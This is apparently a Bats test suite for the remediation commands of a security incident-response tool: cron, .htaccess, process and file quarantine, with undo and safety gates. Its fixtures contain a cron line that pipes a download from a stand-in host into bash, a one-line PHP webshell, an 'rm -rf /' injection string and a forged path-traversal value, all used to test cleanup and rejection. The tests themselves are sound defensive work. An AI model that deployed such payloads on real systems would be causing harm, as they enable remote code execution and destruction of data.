#!/usr/bin/env bats
# tests/07-clean.bats — M7 bl clean coverage per DESIGN.md §5.5 + §11.
# Consumes tests/helpers/{clean-fixture,case-fixture,curator-mock}.bash.

load 'helpers/clean-fixture.bash'
load 'helpers/case-fixture.bash'
load 'helpers/curator-mock.bash'

setup() {
    BL_SOURCE="${BL_SOURCE:-$BATS_TEST_DIRNAME/../bl}"
    BL_VAR_DIR="$(mktemp -d)"
    export BL_VAR_DIR
    export BL_REPO_ROOT="$BATS_TEST_DIRNAME/.."
    export ANTHROPIC_API_KEY="sk-ant-test"
    export BL_MEMSTORE_CASE_ID="memstore_test_stub"
    export BL_CLEAN_DRYRUN_TTL_SECS="${BL_CLEAN_DRYRUN_TTL_SECS:-300}"
    export BL_CLEAN_PROC_GRACE_SECS="${BL_CLEAN_PROC_GRACE_SECS:-1}"   # short for tests
    bl_curator_mock_init
    bl_clean_fixture_seed CASE-2026-7001
}

teardown() {
    bl_curator_mock_teardown
    [[ -n "${SLEEPER_PID:-}" ]] && bl_clean_fixture_teardown_sleeper "$SLEEPER_PID"
    [[ -n "${BL_VAR_DIR:-}" && -d "$BL_VAR_DIR" ]] && rm -rf "$BL_VAR_DIR"
}

# ---------------------------------------------------------------------------
# Group A — Dispatcher routing
# ---------------------------------------------------------------------------

@test "bl clean: missing subcommand exits 64 with hint" {
    run "$BL_SOURCE" clean
    [ "$status" -eq 64 ]
    [[ "$output" == *"missing subcommand"* ]]
}

@test "bl clean: unknown subcommand exits 64" {
    run "$BL_SOURCE" clean notaverb
    [ "$status" -eq 64 ]
    [[ "$output" == *"unknown subcommand: notaverb"* ]]
}

@test "bl clean --help prints usage with all four subcommands + operator-only flags" {
    run "$BL_SOURCE" clean --help
    [ "$status" -eq 0 ]
    [[ "$output" == *"htaccess"* ]]
    [[ "$output" == *"cron"* ]]
    [[ "$output" == *"proc"* ]]
    [[ "$output" == *"file"* ]]
    [[ "$output" == *"--undo"* ]]
    [[ "$output" == *"--unquarantine"* ]]
}

@test "bl clean --undo without backup-id exits 64" {
    run "$BL_SOURCE" clean --undo
    [ "$status" -eq 64 ]
    [[ "$output" == *"--undo requires <backup-id>"* ]]
}

@test "bl clean --unquarantine without entry-id exits 64" {
    run "$BL_SOURCE" clean --unquarantine
    [ "$status" -eq 64 ]
    [[ "$output" == *"--unquarantine requires <entry-id>"* ]]
}

# ---------------------------------------------------------------------------
# Group B — Dry-run-gate enforcement (DESIGN §11.3)
# Live apply without a prior dry-run receipt must exit 68.
# ---------------------------------------------------------------------------

@test "bl clean htaccess: live apply without prior --dry-run exits 68" {
    local dir="$BL_VAR_DIR/www-site"
    bl_clean_fixture_htaccess "$dir"
    local patch
    patch=$(bl_clean_fixture_build_patch_htaccess "$dir/.htaccess")
    run "$BL_SOURCE" clean htaccess "$dir" --patch "$patch" --yes
    [ "$status" -eq 68 ]
    [[ "$output" == *"dry-run gate"* ]]
    rm -f "$patch"
}

@test "bl clean cron: live apply without prior --dry-run exits 68" {
    local patch
    patch=$(mktemp)
    # cron fixture geometry: benign header (1-4), injected (5-6).
    # Hunk removes lines 5-6; correct header: @@ -5,2 +5,0 @@
    printf -- '--- cron-snapshot-testuser\n+++ cron-snapshot-testuser\n@@ -5,2 +5,0 @@\n-# --- INJECTED ---\n-*/2 * * * * curl -s https://evil.example.test/beacon | bash\n' > "$patch"
    run "$BL_SOURCE" clean cron --user testuser --patch "$patch" --yes
    [ "$status" -eq 68 ]
    [[ "$output" == *"dry-run gate"* ]]
    rm -f "$patch"
}

@test "bl clean file: live apply without prior --dry-run exits 68" {
    local path="$BL_VAR_DIR/malware.php"
    printf 'evil\n' > "$path"
    run "$BL_SOURCE" clean file "$path" --reason "test" --yes
    [ "$status" -eq 68 ]
    [[ "$output" == *"dry-run gate"* ]]
}

@test "bl clean proc: live apply without prior --dry-run exits 68" {
    SLEEPER_PID=$(bl_clean_fixture_spawn_sleeper)
    run "$BL_SOURCE" clean proc "$SLEEPER_PID" --yes
    [ "$status" -eq 68 ]
    [[ "$output" == *"dry-run gate"* ]]
}

@test "bl clean: dry-run receipt expiry past TTL — live apply after sleep exits 68" {
    local path="$BL_VAR_DIR/target.php"
    printf 'content\n' > "$path"
    BL_CLEAN_DRYRUN_TTL_SECS=1 run "$BL_SOURCE" clean file "$path" --reason "x" --dry-run
    [ "$status" -eq 0 ]
    sleep 2
    BL_CLEAN_DRYRUN_TTL_SECS=1 run "$BL_SOURCE" clean file "$path" --reason "x" --yes
    [ "$status" -eq 68 ]
    [[ "$output" == *"receipt expired"* ]]
}

# ---------------------------------------------------------------------------
# Group C — Apply + undo roundtrip for htaccess / cron verbs.
# Assertions: backup sha256 equals pre-edit sha256; undo restores exact bytes.
# ---------------------------------------------------------------------------

@test "bl clean htaccess apply-undo roundtrip is byte-identical" {
    local dir="$BL_VAR_DIR/www-site"
    bl_clean_fixture_htaccess "$dir"
    local target="$dir/.htaccess"
    local sha_pre
    sha_pre=$(sha256sum "$target" | cut -d' ' -f1)
    local patch
    patch=$(bl_clean_fixture_build_patch_htaccess "$target")

    # dry-run first to open the gate
    run "$BL_SOURCE" clean htaccess "$dir" --patch "$patch" --dry-run
    [ "$status" -eq 0 ]

    # live apply
    run "$BL_SOURCE" clean htaccess "$dir" --patch "$patch" --yes
    [ "$status" -eq 0 ]
    [[ "$output" == *"applied; backup="* ]]
    local backup_id
    backup_id=$(printf '%s\n' "$output" | grep -oE 'backup=[^ ]+' | sed 's/^backup=//')
    [ -n "$backup_id" ]
    [ -r "$BL_VAR_DIR/backups/$backup_id" ]
    [ -r "$BL_VAR_DIR/backups/$backup_id.meta.json" ]

    # backup sha256 equals pre-edit sha256
    local sha_backup
    sha_backup=$(sha256sum "$BL_VAR_DIR/backups/$backup_id" | cut -d' ' -f1)
    [ "$sha_backup" = "$sha_pre" ]

    # meta sha256_pre cross-check
    local meta_sha
    meta_sha=$(jq -r '.sha256_pre' "$BL_VAR_DIR/backups/$backup_id.meta.json")
    [ "$meta_sha" = "$sha_pre" ]

    # target changed post-apply
    local sha_post
    sha_post=$(sha256sum "$target" | cut -d' ' -f1)
    [ "$sha_post" != "$sha_pre" ]

    # undo
    run "$BL_SOURCE" clean --undo "$backup_id" --yes
    [ "$status" -eq 0 ]

    # byte-identical
    local sha_restored
    sha_restored=$(sha256sum "$target" | cut -d' ' -f1)
    [ "$sha_restored" = "$sha_pre" ]

    # backup + meta cleaned up
    [ ! -e "$BL_VAR_DIR/backups/$backup_id" ]
    [ ! -e "$BL_VAR_DIR/backups/$backup_id.meta.json" ]

    rm -f "$patch"
}

@test "bl clean htaccess: backup meta validates against schemas/backup-manifest.json" {
    local dir="$BL_VAR_DIR/www-site"
    bl_clean_fixture_htaccess "$dir"
    local patch
    patch=$(bl_clean_fixture_build_patch_htaccess "$dir/.htaccess")
    run "$BL_SOURCE" clean htaccess "$dir" --patch "$patch" --dry-run
    run "$BL_SOURCE" clean htaccess "$dir" --patch "$patch" --yes
    [ "$status" -eq 0 ]
    local backup_id
    backup_id=$(printf '%s\n' "$output" | grep -oE 'backup=[^ ]+' | sed 's/^backup=//')
    local meta="$BL_VAR_DIR/backups/$backup_id.meta.json"

    # Required fields present + correct types
    local required_check
    required_check=$(jq '
        (.backup_id | type == "string") and
        (.original_path | type == "string") and
        (.sha256_pre | type == "string") and
        (.size_bytes | type == "number") and
        (.uid | type == "number") and
        (.gid | type == "number") and
        (.perms_octal | type == "string") and
        (.mtime_epoch | type == "number") and
        (.verb | . == "clean.htaccess") and
        (.iso_ts | type == "string")
    ' "$meta")
    [ "$required_check" = "true" ]

    rm -f "$patch"
}

@test "bl clean htaccess: tampered backup fails undo integrity check with exit 65" {
    local dir="$BL_VAR_DIR/www-site"
    bl_clean_fixture_htaccess "$dir"
    local patch
    patch=$(bl_clean_fixture_build_patch_htaccess "$dir/.htaccess")
    run "$BL_SOURCE" clean htaccess "$dir" --patch "$patch" --dry-run
    run "$BL_SOURCE" clean htaccess "$dir" --patch "$patch" --yes
    local backup_id
    backup_id=$(printf '%s\n' "$output" | grep -oE 'backup=[^ ]+' | sed 's/^backup=//')

    # Tamper: append a byte to the backup file
    printf 'TAMPER' >> "$BL_VAR_DIR/backups/$backup_id"

    run "$BL_SOURCE" clean --undo "$backup_id" --yes
    [ "$status" -eq 65 ]
    [[ "$output" == *"integrity fail"* ]]
    rm -f "$patch"
}

@test "bl clean cron apply-undo roundtrip is byte-identical" {
    # Skip if crontab not available in container (both debian12 + rocky9 have it,
    # but guard for portability when a future OS target lacks it)
    if ! command -v crontab >/dev/null 2>&1; then
        skip "crontab binary not available in this image"
    fi
    # Seed a crontab for the current user (tests run as root in batsman container)
    crontab -u root "$BATS_TEST_DIRNAME/fixtures/crontab-clean-target.txt"

    local patch
    patch=$(mktemp)
    cat > "$patch" <<EOF
--- $BL_VAR_DIR/state/cron-snapshot-root.txt
+++ $BL_VAR_DIR/state/cron-snapshot-root.txt
@@ -5,2 +5,0 @@
-# --- INJECTED ---
-*/2 * * * * curl -s https://evil.example.test/beacon | bash
EOF

    run "$BL_SOURCE" clean cron --user root --patch "$patch" --dry-run
    [ "$status" -eq 0 ]
    run "$BL_SOURCE" clean cron --user root --patch "$patch" --yes
    [ "$status" -eq 0 ]

    # crontab should no longer contain the beacon line
    run crontab -u root -l
    [[ "$output" != *"evil.example.test/beacon"* ]]

    # undo restores the beacon line
    local backup_id
    backup_id=$(find "$BL_VAR_DIR/backups" -maxdepth 1 -name '*.cron-snapshot-root.txt' -printf '%f\n' | head -1)
    [ -n "$backup_id" ]
    run "$BL_SOURCE" clean --undo "$backup_id" --yes
    [ "$status" -eq 0 ]
    run crontab -u root -l
    [[ "$output" == *"evil.example.test/beacon"* ]]

    # Cleanup
    crontab -r -u root 2>/dev/null || true   # may already be gone
    rm -f "$patch"
}

# ---------------------------------------------------------------------------
# Group D — clean.file quarantine + unquarantine roundtrip.
# Asserts: original path is MOVED (not unlinked), manifest validates against
# schemas/quarantine-manifest.json, unquarantine restores path + perms + owner.
# ---------------------------------------------------------------------------

@test "bl clean file: quarantine + unquarantine roundtrip preserves bytes, perms, uid, gid, mtime" {
    local path="$BL_VAR_DIR/site/public_html/malware.php"
    mkdir -p "$(dirname "$path")"
    printf '<?php system($_GET["c"]); ?>\n' > "$path"
    chmod 0640 "$path"
    # Record pre-quarantine state for roundtrip assertion
    local sha_pre
    sha_pre=$(sha256sum "$path" | cut -d' ' -f1)
    local size_pre uid_pre gid_pre perms_pre
    size_pre=$(stat -c '%s' "$path")
    uid_pre=$(stat -c '%u' "$path")
    gid_pre=$(stat -c '%g' "$path")
    perms_pre=$(stat -c '%a' "$path")

    run "$BL_SOURCE" clean file "$path" --reason "webshell" --dry-run
    [ "$status" -eq 0 ]
    run "$BL_SOURCE" clean file "$path" --reason "webshell" --yes
    [ "$status" -eq 0 ]
    [[ "$output" == *"quarantined; entry_id="* ]]

    # Original path is gone (moved, not copied-and-kept)
    [ ! -e "$path" ]

    # Quarantine dir populated
    local entry_path
    entry_path=$(find "$BL_VAR_DIR/quarantine/CASE-2026-7001" -maxdepth 1 -name "${sha_pre}-malware.php" | head -1)
    [ -n "$entry_path" ]
    [ -r "$entry_path" ]
    [ -r "$entry_path.meta.json" ]

    # Meta schema-validates
    local meta_check
    meta_check=$(jq '
        (.entry_id | type == "string") and
        (.original_path | type == "string") and
        (.sha256 | type == "string") and
        (.size_bytes | type == "number") and
        (.uid | type == "number") and
        (.gid | type == "number") and
        (.perms_octal | type == "string") and
        (.mtime_epoch | type == "number") and
        (.case_id | type == "string") and
        (.reason == "webshell") and
        (.iso_ts | type == "string")
    ' "$entry_path.meta.json")
    [ "$meta_check" = "true" ]

    # Content integrity
    local sha_quar
    sha_quar=$(sha256sum "$entry_path" | cut -d' ' -f1)
    [ "$sha_quar" = "$sha_pre" ]

    # Unquarantine
    local entry_id
    entry_id=$(basename "$entry_path")
    run "$BL_SOURCE" clean --unquarantine "$entry_id" --yes
    [ "$status" -eq 0 ]

    # Original path restored
    [ -r "$path" ]
    local sha_restored size_restored uid_restored gid_restored perms_restored
    sha_restored=$(sha256sum "$path" | cut -d' ' -f1)
    size_restored=$(stat -c '%s' "$path")
    uid_restored=$(stat -c '%u' "$path")
    gid_restored=$(stat -c '%g' "$path")
    perms_restored=$(stat -c '%a' "$path")
    [ "$sha_restored" = "$sha_pre" ]
    [ "$size_restored" = "$size_pre" ]
    [ "$uid_restored" = "$uid_pre" ]
    [ "$gid_restored" = "$gid_pre" ]
    [ "$perms_restored" = "$perms_pre" ]

    # Quarantine artifact + meta cleaned up
    [ ! -e "$entry_path" ]
    [ ! -e "$entry_path.meta.json" ]
}

@test "bl clean --unquarantine refuses to overwrite existing original_path with exit 71" {
    local path="$BL_VAR_DIR/site/malware.php"
    mkdir -p "$(dirname "$path")"
    printf 'evil\n' > "$path"
    run "$BL_SOURCE" clean file "$path" --reason "x" --dry-run
    run "$BL_SOURCE" clean file "$path" --reason "x" --yes
    local entry_id
    entry_id=$(find "$BL_VAR_DIR/quarantine/CASE-2026-7001" -maxdepth 1 -type f ! -name '*.meta.json' -printf '%f\n' | head -1)

    # Recreate a file at the original path (simulates operator recreating mid-session)
    printf 'new content\n' > "$path"

    run "$BL_SOURCE" clean --unquarantine "$entry_id" --yes
    [ "$status" -eq 71 ]
    [[ "$output" == *"refusing to overwrite"* ]]
}

@test "bl clean --unquarantine refuses TOCTOU symlink at original_path" {
    # Quarantine a file, then race a symlink at the original path location
    # before unquarantine. The symlink guard must abort with BL_EX_CONFLICT
    # rather than allow restore content to follow the symlink to a sniped target.
    local path="$BL_VAR_DIR/site/sym-malware.php"
    local sniped="$BL_VAR_DIR/sniped-target"
    mkdir -p "$(dirname "$path")"
    printf 'evil\n' > "$path"
    run "$BL_SOURCE" clean file "$path" --reason "x" --dry-run
    run "$BL_SOURCE" clean file "$path" --reason "x" --yes
    [ "$status" -eq 0 ]
    local entry_id
    entry_id=$(find "$BL_VAR_DIR/quarantine/CASE-2026-7001" -maxdepth 1 -type f ! -name '*.meta.json' -printf '%f\n' | head -1)

    # Race: pre-create a symlink at the original_path location pointing at a sniped target.
    rm -f "$path"
    ln -s "$sniped" "$path"
    [ -L "$path" ]
    [ ! -e "$sniped" ]   # target itself does not exist yet

    run "$BL_SOURCE" clean --unquarantine "$entry_id" --yes
    [ "$status" -eq 71 ]   # BL_EX_CONFLICT
    [[ "$output" == *"symlink"* ]]
    # Symlink unchanged; sniped target NOT created
    [ -L "$path" ]
    [ ! -e "$sniped" ]
    # Quarantine entry preserved (refused restore must not lose data)
    [ -e "$BL_VAR_DIR/quarantine/CASE-2026-7001/$entry_id" ]
}

@test "bl clean --unquarantine refuses traversal segment in original_path" {
    # Quarantine a file, then forge meta.json with `..` traversal segment.
    local path="$BL_VAR_DIR/site/trav-malware.php"
    mkdir -p "$(dirname "$path")"
    printf 'evil\n' > "$path"
    run "$BL_SOURCE" clean file "$path" --reason "x" --dry-run
    run "$BL_SOURCE" clean file "$path" --reason "x" --yes
    [ "$status" -eq 0 ]
    local entry_id meta_path
    entry_id=$(find "$BL_VAR_DIR/quarantine/CASE-2026-7001" -maxdepth 1 -type f ! -name '*.meta.json' -printf '%f\n' | head -1)
    meta_path="$BL_VAR_DIR/quarantine/CASE-2026-7001/$entry_id.meta.json"

    # Tamper meta to claim original_path traverses out of intended dir
    local tampered
    tampered=$(jq --arg p "/var/lib/bl/quarantine/../../etc/cron.d/blacklight-priv" '.original_path = $p' "$meta_path")
    printf '%s' "$tampered" > "$meta_path"

    run "$BL_SOURCE" clean --unquarantine "$entry_id" --yes
    [ "$status" -eq 67 ]   # BL_EX_SCHEMA_VALIDATION_FAIL
    [[ "$output" == *"traversal"* ]]
}

@test "bl defend firewall rejects --reason with embedded double-quote" {
    run "$BL_SOURCE" defend firewall "203.0.113.99" --backend iptables --reason 'evil"; rm -rf /; #'
    [ "$status" -eq 64 ]
    [[ "$output" == *"--reason invalid"* ]]
}

@test "bl clean file: basename with spaces sanitised in entry_id" {
    local path="$BL_VAR_DIR/site/weird file name.php"
    mkdir -p "$(dirname "$path")"
    printf 'x\n' > "$path"
    run "$BL_SOURCE" clean file "$path" --reason "t" --dry-run
    run "$BL_SOURCE" clean file "$path" --reason "t" --yes
    [ "$status" -eq 0 ]
    # Verify NO entry contains spaces
    local spaced
    spaced=$(find "$BL_VAR_DIR/quarantine/CASE-2026-7001" -maxdepth 1 -name '* *' | head -1)
    [ -z "$spaced" ]
    # Verify the sanitised entry exists
    local sane
    sane=$(find "$BL_VAR_DIR/quarantine/CASE-2026-7001" -maxdepth 1 -name '*weird_file_name.php' | head -1)
    [ -n "$sane" ]
}

# ---------------------------------------------------------------------------
# Group E — clean.proc capture + grace window.
# bl_clean_fixture_spawn_sleeper is defined in clean-fixture.bash; spawns a
# `sleep 120` and echos the pid. Test kills the sleeper via bl clean proc.
# ---------------------------------------------------------------------------

@test "bl clean proc: capture writes /proc snapshot files to case evidence before kill" {
    SLEEPER_PID=$(bl_clean_fixture_spawn_sleeper)
    sleep 0.2   # give sleeper time to enter sleep syscall; avoids race

    run "$BL_SOURCE" clean proc "$SLEEPER_PID" --dry-run
    [ "$status" -eq 0 ]
    run "$BL_SOURCE" clean proc "$SLEEPER_PID" --yes
    [ "$status" -eq 0 ]

    local evid_dir="$BL_VAR_DIR/cases/CASE-2026-7001/evidence/proc-$SLEEPER_PID"
    [ -d "$evid_dir" ]
    [ -r "$evid_dir/cmdline" ]
    # Non-empty assertion guards against silent "capture ran but produced empty
    # files" regression — the race-tolerant `|| printf ''` fallback in the
    # handler could otherwise mask a broken capture path (INFO-level finding
    # from challenge review).
    [ -s "$evid_dir/cmdline" ]
    [ -r "$evid_dir/status" ]
    [ -s "$evid_dir/status" ]
    [ -r "$evid_dir/maps" ]
    [ -r "$evid_dir/exe" ]
    [ -r "$evid_dir/cwd" ]
    # lsof is optional — file exists but may be empty
    [ -r "$evid_dir/lsof" ] || true   # tolerate container-minimal lsof-missing

    # Pid is dead (SIGTERM success OR SIGKILL within BL_CLEAN_PROC_GRACE_SECS)
    ! kill -0 "$SLEEPER_PID" 2>/dev/null
    SLEEPER_PID=""   # prevent teardown from trying to re-kill
}

@test "bl clean proc --capture=off skips capture; pid still killed" {
    SLEEPER_PID=$(bl_clean_fixture_spawn_sleeper)
    sleep 0.2

    run "$BL_SOURCE" clean proc "$SLEEPER_PID" --capture=off --dry-run
    [ "$status" -eq 0 ]
    run "$BL_SOURCE" clean proc "$SLEEPER_PID" --capture=off --yes
    [ "$status" -eq 0 ]

    [ ! -d "$BL_VAR_DIR/cases/CASE-2026-7001/evidence/proc-$SLEEPER_PID" ]
    ! kill -0 "$SLEEPER_PID" 2>/dev/null
    SLEEPER_PID=""
}

@test "bl clean proc: non-existent pid exits 72" {
    run "$BL_SOURCE" clean proc 99999999 --yes
    [ "$status" -eq 72 ]
    [[ "$output" == *"pid not running"* ]]
}

@test "bl clean proc: non-numeric pid exits 64" {
    run "$BL_SOURCE" clean proc notapid --yes
    [ "$status" -eq 64 ]
    [[ "$output" == *"pid must be numeric"* ]]
}

@test "bl clean proc: SIGTERM+grace+SIGKILL respects BL_CLEAN_PROC_GRACE_SECS" {
    SLEEPER_PID=$(bl_clean_fixture_spawn_sleeper)
    sleep 0.2
    # Short grace so SIGKILL fires quickly
    local start_sec end_sec elapsed
    start_sec=$(date +%s)

    run "$BL_SOURCE" clean proc "$SLEEPER_PID" --dry-run
    BL_CLEAN_PROC_GRACE_SECS=1 run "$BL_SOURCE" clean proc "$SLEEPER_PID" --yes
    [ "$status" -eq 0 ]

    end_sec=$(date +%s)
    elapsed=$(( end_sec - start_sec ))
    # Grace window is 1s; handler finishes within 2s comfortably
    [ "$elapsed" -lt 4 ]
    ! kill -0 "$SLEEPER_PID" 2>/dev/null
    SLEEPER_PID=""
}

# ---------------------------------------------------------------------------
# M11 P9 — dry-run-receipt-expired rejection + concurrent flock atomicity
# ---------------------------------------------------------------------------

@test "bl clean htaccess — dry-run-receipt-expired forces re-dry-run before live apply" {
    # Real path: $BL_VAR_DIR/state/dry-run/<verb>-<sha>.ok where sha is
    # _bl_clean_sha256_path of target ($dir/.htaccess), verb=clean.htaccess.
    # Format: single ISO-8601 line (per src/bl.d/83-clean.sh:80).
    # TTL: BL_CLEAN_DRYRUN_TTL_SECS, default 300s (line 93).
    # Expiry returns BL_EX_TIER_GATE_DENIED=68 deterministically (line 113).
    mkdir -p "$BL_VAR_DIR/state/dry-run" "$BL_VAR_DIR/scratch"
    printf 'CASE-2026-0042' > "$BL_VAR_DIR/state/case.current"
    printf '<FilesMatch "\\.php$">Require all denied</FilesMatch>\n' > "$BL_VAR_DIR/scratch/.htaccess"
    # Compute the receipt path the same way _bl_clean_sha256_path does
    local target="$BL_VAR_DIR/scratch/.htaccess"
    local sha
    sha=$(printf '%s' "$target" | sha256sum | cut -c1-8)
    local receipt="$BL_VAR_DIR/state/dry-run/clean.htaccess-${sha}.ok"
    # Write a stale ISO-8601 timestamp that age-exceeds the 300s TTL deterministically
    printf '2026-01-01T00:00:00Z\n' > "$receipt"
    # Provide a real patch file — bl_clean_htaccess rejects with 64 if --patch missing
    printf '%s\n' '--- a/.htaccess' '+++ b/.htaccess' '@@ -1 +0,0 @@' '-<FilesMatch "\.php$">Require all denied</FilesMatch>' > "$BL_VAR_DIR/scratch/clean.patch"
    run "$BL_SOURCE" clean htaccess "$BL_VAR_DIR/scratch" --patch "$BL_VAR_DIR/scratch/clean.patch" --yes
    [ "$status" -eq 68 ]   # BL_EX_TIER_GATE_DENIED — receipt expired path
    [[ "$output" == *"receipt expired"* ]] || [[ "$output" == *"re-run with --dry-run"* ]]
    # Receipt must have been removed by _bl_clean_dry_run_check on expiry detection
    [ ! -r "$receipt" ]
}

@test "bl ledger — concurrent flock-protected appends produce monotonic records" {
    printf 'CASE-2026-0042' > "$BL_VAR_DIR/state/case.current"
    # Source the wrapper functions in a subshell to call bl_ledger_append twice in parallel
    ( . "$BL_SOURCE" 2>/dev/null
      bl_ledger_append CASE-2026-0042 '{"ts":"2026-04-25T00:00:01Z","case":"CASE-2026-0042","kind":"observe_emitted","payload":{"obs_id":"obs-A"}}' &
      bl_ledger_append CASE-2026-0042 '{"ts":"2026-04-25T00:00:02Z","case":"CASE-2026-0042","kind":"observe_emitted","payload":{"obs_id":"obs-B"}}' &
      wait
    )
    local ledger_file="$BL_VAR_DIR/ledger/CASE-2026-0042.jsonl"
    [ -r "$ledger_file" ]
    local count
    count=$(wc -l < "$ledger_file")
    [ "$count" -eq 2 ]
    # Both records are valid jq lines (no torn writes)
    jq -e '.kind' < <(head -1 "$ledger_file") > /dev/null
    jq -e '.kind' < <(tail -1 "$ledger_file") > /dev/null
}
